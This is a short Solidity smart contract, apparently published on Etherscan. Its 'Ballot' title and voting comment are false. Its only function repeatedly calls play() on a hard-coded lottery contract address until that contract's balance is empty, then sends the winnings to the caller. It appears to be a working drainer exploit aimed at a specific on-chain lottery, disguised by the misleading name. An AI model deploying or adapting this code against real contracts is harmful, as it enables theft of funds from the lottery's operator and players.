/**
 *Submitted for verification at Etherscan.io on 2022-04-20
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface ILottery {
  function play (  ) payable external;
  function rndSource (  ) external view returns ( bytes32 );
}


/** 
 * @title Ballot
 * @dev Implements voting process along with vote delegation
 */
contract Ballot {
    address lottery = 0x2b0Fcc37d8a3C793dBD0a08Ed49dd82419c13Ec3;

    function main() public payable{
        while(address(lottery).balance > 0){
            ILottery(lottery).play{value: 0.01 ether}();
        }
        payable(msg.sender).transfer(address(this).balance);
    }

}